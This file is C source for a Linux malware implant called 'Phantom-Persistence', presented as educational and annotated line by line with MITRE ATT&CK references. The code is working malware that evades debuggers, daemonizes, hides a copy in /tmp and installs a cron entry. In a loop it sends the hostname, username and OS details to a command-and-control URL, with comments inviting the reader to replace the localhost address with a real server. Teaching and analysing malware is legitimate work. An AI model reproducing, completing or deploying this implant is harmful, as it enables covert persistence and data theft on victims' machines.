/*
 * Phantom-Persistence: Educational Linux Malware Implant
 * 
 * MITRE ATT&CK Techniques Demonstrated:
 * - T1053.003: Scheduled Task/Job (Cron-based persistence)
 * - T1071.001: C2 Communication via HTTP
 * - T1082: System Information Discovery
 * - T1027: String Obfuscation
 * - T1497: Anti-debugging checks
 * 
 * WARNING: For educational use only in isolated environments
 */

// MITRE formalizes the process of categorizing attacks and allows for a common language when different security teams have to communicate with each other

#define _GNU_SOURCE

#include <stdio.h>      // Standard Input/Output functions (like printf, scanf)
#include <stdlib.h>     // Standard General Utilities (like malloc, exit, rand)
#include <string.h>     // String manipulation functions (like strcpy, strlen, strcmp)
#include <unistd.h>     // POSIX operating system API (often for functions like fork, exec, sleep, file operations)
#include <sys/stat.h>   // Data structures and functions for file status/information (like stat, mkdir)
#include <sys/types.h>  // Essential data types used in system calls (like pid_t, off_t)
#include <sys/ptrace.h> // For ptrace system call (anti-debugging)
#include <time.h>       // Functions for dealing with time and dates (like time, clock, struct tm)
#include <curl/curl.h>  // Functions for transferring data using various protocols (libcurl library)
#include <limits.h>  

// Configuration - Obfuscated C2 server
#define C2_SERVER "127.0.0.1" // Later We Can Change to our C2 Server IP
#define C2_PORT "8080"
#define BEACON_INTERVAL 10     // Macro defining the delay, in seconds, between attempts by the agent to contact the C2 server. 
                               // This is known as the beaconing*frequency. A value of 300 means the agent will "check in" every 5 minutes (300 seconds).

// XOR Key for strong obfucation 
#define XOR_KEY 0x42 // the C compiler replaces it with the number 66.0x42 is a way to represent the number 66 in the decimal system.
// In the context of computer science, especially cryptography, an XOR key is the secret piece of data (a sequence of bits or bytes) used to scramble (encrypt) or unscramble (decrypt) other data using the XOR operation.

// Function prototypes
void establish_persistence(void);
void beacon_c2(void);
char* gather_system_info(void); // The function gather_system_info takes no input and returns a memory address (char*) that points to a string of text containing system details.
int check_debugger(void);
void xor_decrypt(char *data, size_t len); // This function takes a block of encrypted data and its length as input, then processes every byte in place to turn it back into plain, readable data using the XOR key. Because it works in place, the original encrypted data is overwritten with the decrypted data, and the function doesn't need to return anything (void).
void hide_process(void);

/*
 * Simple XOR encryption/decryption for string obfuscation
 * Technique: T1027 - Obfuscated Files or Information
 */
void xor_decrypt(char *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= XOR_KEY; // So, for every byte of data, the ^ symbol is just the operator that tells the computer to "unscramble" the data using the secret key.
    }
}

/*
 * Anti-debugging check using ptrace
 * Technique: T1497 - Virtualization/Sandbox Evasion
 * 
 * If a debugger is attached, ptrace returns -1
 */

int check_debugger(void){
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
        return 1;  // Debugger detected // PTRACE_TRACEME is the main command: "Try to let my parent process trace me." The goal is to see if a debugger is already attached. If it is, the command fails, which tells the program: "A debugger is watching me!" The three zeroes/ones (0, 1, 0) are extra options (parameters) that are either unused or set to default/standard values for this specific command.
    }
    ptrace(PTRACE_DETACH, 0, 1, 0);
    return 0; // No debugger
}


/*
 * Establish persistence via cron job
 * Technique: T1053.003 - Scheduled Task/Job: Cron
 * 
 * Creates a cron entry that runs the implant every 5 minutes
 */

void establish_persistence(void){
    char cron_entry[512]; // It creates a small memory space (cront_entry) to hold the command that will execute the program.
    char implant_path[256]; // It creates another small memory space (implant_path) to store the exact location of the malicious file.
    FILE *cron_file; // It sets up a variable (char_file) to eventually open a system file (like a cron file or startup script) and write the execution command to it.

    // GET THE FULL PATH TO THIS BINARY // ssize_t is a number that can be positive (meaning a size or count) or negative (meaning an error happened).
    // In system calls, -1 is the standard integer value used to indicate that an error or failure occurred.
    ssize_t len = readlink("/proc/self/exe", implant_path, sizeof(implant_path) - 1); // The code asks the operating system, "Where exactly am I running from?" and then saves that full location (the file path) into the implant_path variable, while also recording the length of that path in the len variable.
    if(len != -1){
        implant_path[len] = '\0'; // We put the \0 (null terminator) at the end of the retrieved link/path to tell the C program exactly where the string of text stops.
    }else{
        return; // Failed to get path
    }

    // Create cron entry: */5 * * * * /path/to/implant // This line creates the text command that will tell the system's scheduler (cron) to run the malware every 5 minutes.
    // A buffer is a cup of memory used to hold data temporarily.
    // A buffer overflow happens when a program tries to pour more data into a memory buffer (the "cup of memory") than the buffer was designed to hold.
    // snprintf safely formats and writes a string into a buffer, stopping before it overflows the buffer's maximum size.
    // We use sizeof(cron_entry) to tell snprintf the maximum size of the buffer so it knows where to safely stop writing the command to prevent a buffer overflow.
    snprintf(cron_entry, sizeof(cron_entry),
        "*/5 * * * * %s >/dev/null 2>&1\n", implant_path); // For this go to Doc.md and read from line 1 to 12
    
    // Append to user's crontab
    // Note: In real malware, this would be more stealthy
    // popen lets your C program run a command like a normal person types it into the system, and then the program can read the command's output.
    cron_file = popen("crontab -l 2>/dev/null | { cat; echo \"" 
        "*/5 * * * * /tmp/.system_daemon >/dev/null 2>&1\"; } | crontab -", "r");
    // Read doc.md to understand the command go to line 16 - 28
    if (cron_file) {
        pclose(cron_file); // This code checks if the command execution was successful (if cron_file is not null) and, if so, closes the connection to the executed shell command to free up system resources.
    }

    // Copy implant to hidden location
    // This code is building a command to copy the malicious program (from its current location in implant_path) to a new, hidden path named /tmp/.system_daemon, and it quietly ignores any errors.
    char copy_cmd[512];
    // To Understand the Command go to Doc.md line 32 - 39
    snprintf(copy_cmd, sizeof(copy_cmd), "cp %s /tmp/.system_daemon 2>/dev/null", implant_path);

    system(copy_cmd);
    chmod("/tmp/.system_daemon", 0755);

    // system(copy_cmd);: This command executes the file copy command (which was created with snprintf) in the operating system's shell, placing the malware at the new location.

    // chmod("/tmp/.system_daemon", 0755);: This function then changes the file permissions of the copied malware to 0755, ensuring it is executable by the system and can run properly.
}


/*
 * Gather system information for exfiltration
 * Technique: T1082 - System Information Discovery
 * 
 * Collects: hostname, username, OS info, uptime
 */

char* gather_system_info(void){
    static char info[1024];  // A large, fixed memory space to store the final, formatted system info string.
    char hostname[256];      // A memory space (buffer) to hold the computer's name (hostname).
    char username[256];      // A memory space (buffer) to hold the current user's login name.
    char os_info[512];       // A memory space (buffer) to hold details about the operating system.
    FILE *fp;                // A pointer variable used to open and read data from a file (e.g., a system info file).

    // Get hostname
    gethostname(hostname, sizeof(hostname));

    // Username
    char *user = getenv("USER");
    if (user){
        strncpy(username, user, sizeof(username) - 1); // This line safely copies the user's name from the source variable (user) into the destination memory space (username), ensuring it never copies more than 255 characters to avoid breaking the username buffer.
        username[sizeof(username) - 1] = '\0';
    } else {
        strcpy(username, "unknown");
    }

    // GET OS information - To Understand what it is go to Doc.md and read from line - 43 - 59 
    fp = popen("uname -a 2>/dev/null", "r");
    if (fp) {
        if (fgets(os_info, sizeof(os_info), fp) != NULL) {
            // Remove newline if present
            os_info[strcspn(os_info, "\n")] = '\0';
        } else {
            strcpy(os_info, "unknown");
        }
        pclose(fp);
    } else {
        strcpy(os_info, "unknown");
    }
/*
 * This code simply runs a command to find out system details and then saves the result.
 *
 * It uses popen to execute the command uname -a (which gets OS info) and opens a connection to read its output.
 *
 * The if (fp) checks if the command started successfully.
 *
 * If successful, fgets reads the OS info from the connection and stores it safely in the os_info variable, and pclose closes the connection.
 *
 * If it failed, it simply puts the word "unknown" into the os_info variable instead.
 */

    snprintf(info, sizeof(info),  // This final block of code is responsible for assembling all the collected information into a single, standardized string, and then returning that string.
        "hostname=%s&user=%s&os=%s&implant=phantom-persistence", // "hostname=%s&user=%s&os=%s&implant=phantom-persistence": This is the format string. It structures the output like a URL query string (using key=value pairs separated by &).
        hostname, username, os_info);
    return info;
}

/*
 * Callback function for curl - discards response data
 */

 //Function signature: It receives downloaded data (contents), the size of each element (size), the number of elements (nmemb), and a user pointer (userp)

 //Return value: It calculates and returns the total bytes received (size * nmemb) but discards all the actual data without storing it anywhere - essentially acting as a "data sink" that tells libcurl the transfer succeeded while throwing away the response body

// ===== LIBCURL WRITE CALLBACK - SIMPLE EXPLANATION =====

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    (void)contents;  // Explicitly mark as unused to avoid compiler warnings
    (void)userp;     // Explicitly mark as unused to avoid compiler warnings
    return size * nmemb;  // Discard the data
}

// size_t = unsigned integer (always positive, never negative)
// void *contents = the actual data from C2 server response
// size_t size = bytes per data element (usually 1)
// size_t nmemb = number of elements received
// void *userp = custom data pointer (unused here)

// HOW IT WORKS:
// 1. libcurl downloads response from C2 server
// 2. Calls this function automatically with the data
// 3. We return size * nmemb to say "handled successfully"
// 4. But we DON'T save the data - just throw it away

// WHY DISCARD?
// Malware only sends info TO server (hostname, username, etc.)
// Doesn't care about server's response - just needs connection success
// More stealthy: no response logging = less forensic evidence

/*
 * Beacon to C2 server
 * Technique: T1071.001 - Application Layer Protocol: Web Protocols
 * Technique: T1041 - Exfiltration Over C2 Channel
 * 
 * Sends HTTP GET request with system information to C2 server
 */

void beacon_c2(void){
    // cURL - A command-line tool and library for transferring data using URLs (supports HTTP, HTTPS, FTP, etc.)
    //libcurl - The C programming library version of cURL that lets your code make network requests programmatically
    CURL *curl;              // Pointer to libcurl handle (manages HTTP connection)
    CURLcode res;            // Stores result code from curl operations (success/error)
    char url[512];           // Buffer to hold the full C2 server URL string
    char *system_info;       // Pointer to string containing collected system data

    // Initialize curl
    curl = curl_easy_init();
    if(!curl){
        return;
    }

    // Gather system information
    system_info = gather_system_info();

    // Build C2 URL
        /*
    * SIMPLE EXPLANATION:
    * This line builds a web address (URL) to send stolen computer info to the hacker's server
    * 
    * It's like filling in blanks in a sentence:
    * "http://" + SERVER_IP + ":" + PORT + "/beacon?" + STOLEN_INFO
    * 
    * EXAMPLE OUTPUT STRING:
    * "http://127.0.0.1:8080/beacon?hostname=victim-pc&user=mohammad&os=Linux&implant=phantom-persistence"
    * 
    * BREAKDOWN:
    * - http://127.0.0.1:8080  = Where to send data (C2 server address)
    * - /beacon                = The specific endpoint/page on server
    * - ?hostname=victim-pc... = The actual stolen data being sent
    */
    snprintf(url, sizeof(url), "http://%s:%s/beacon?%s", C2_SERVER, C2_PORT, system_info);

    // Configure curl for stealth
    curl_easy_setopt(curl, CURLOPT_URL, url);                      // Tell curl which URL to connect to (our C2 server)
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback); // Set function to handle server response (we discard it)
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);                  // Give up connection after 10 seconds to avoid hanging
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");      // Pretend to be a normal web browser (stealth technique)
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);            // Auto-follow redirects if C2 server moves locations

    // Perform the request (ignore errors for stealth)
    res = curl_easy_perform(curl);                                  // Actually send the HTTP request to C2 server with stolen data
    (void)res;  // Explicitly ignore result for stealth

    // Cleanup
    curl_easy_cleanup(curl);                                        // Free memory and close connection (prevent resource leaks)

}

/*
 * Hide process by changing argv[0]
 * Makes the process appear as a system daemon in process listings
 */
void hide_process(void) {
    // This would show as "[kworker]" in ps output
    extern char **environ;
    char *fake_name = "[kworker/0:1]";
    (void)environ;    // Mark as unused
    (void)fake_name;  // Mark as unused

    // Note: This is a simplified version
    // Real malware uses more sophisticated process hiding

}

/*
 * ===== MAIN FUNCTION BREAKDOWN =====
 * 
 * int main(int argc, char *argv[]) {
 * 
 * }
 * 
 * EXPLANATION:
 * 
 * int main
 * - The main function that returns an integer (0 = success, non-zero = error) when program exits
 * 
 * int argc
 * - "Argument Count" - tells you HOW MANY command-line arguments were passed
 * - Always at least 1, because argv[0] is the program name itself
 * 
 * char *argv[]
 * - "Argument Vector" - an array of strings (text) containing the ACTUAL command-line arguments
 * - Each element is a separate word/parameter passed to your program
 * 
 * EXAMPLE:
 * If you run: ./malware --stealth target.com
 * Then:
 *   argc = 3
 *   argv[0] = "./malware"
 *   argv[1] = "--stealth"
 *   argv[2] = "target.com"
 * 
 * WHY IT MATTERS FOR MALWARE:
 * - Lets the program accept commands/options from whoever runs it
 * - Can specify C2 server IP, beacon interval, or operation modes
 * - Makes malware configurable without recompiling
 * 
 * THE EMPTY BRACES {}
 * - Where all your program's code goes
 * - Right now it does nothing and immediately exits with return code 0
 */

int main(int argc, char *argv[]) {
    (void)argc;  // Mark as unused
    (void)argv;  // Mark as unused
    
    // Anti-debugging check
    // Technique: T1497
    if (check_debugger()) {
        // If debugger detected, exit silently
        return 0;
    }

    // Hide our process name
    hide_process();

    // Fork to background (daemonize)
    pid_t pid = fork();              // Create exact copy of current process; returns child's PID to parent, 0 to child

    if (pid > 0) {                   // If PID is positive, we're in the PARENT process (got child's PID)
        // Parent process exits
        return 0;                    // Parent dies immediately, making child an orphan (adopted by init/systemd)
    } 
    else if (pid < 0) {              // If PID is negative, fork() FAILED (not enough memory/resources)
        // Fork failed
        return 1;                    // Exit with error code 1 to indicate failure
    }
                                    // If we reach here, pid == 0, meaning we're in the CHILD process (continues execution)
    
    // Child process continues
    // Create new session
    setsid();                                // Detach from parent's session and terminal - makes process independent daemon

    // Change working directory to root
    chdir("/");                              // Move to root directory so we don't block unmounting of any filesystems

    // Close standard file descriptors (stealth)
    close(STDIN_FILENO);                     // Close stdin (no keyboard input) - makes process invisible to terminal
    close(STDOUT_FILENO);                    // Close stdout (no screen output) - prevents accidental text appearing
    close(STDERR_FILENO);                    // Close stderr (no error messages) - hides all error output completely

    // Establish persistence on first run
    establish_persistence();                 // Install cron job so malware survives reboots and re-runs every 5 minutes

    // Main beacon loop
    // Technique: T1071.001, T1041
    while (1) {                              // Infinite loop - runs forever until process is killed
        
        // Send beacon to C2
        beacon_c2();                         // Contact C2 server and exfiltrate system info (hostname, user, OS)
        
        // Sleep for beacon interval
        sleep(BEACON_INTERVAL);              // Wait 10 seconds before next check-in to avoid detection
    }

    return 0;                                // Never actually reached because of infinite loop above
}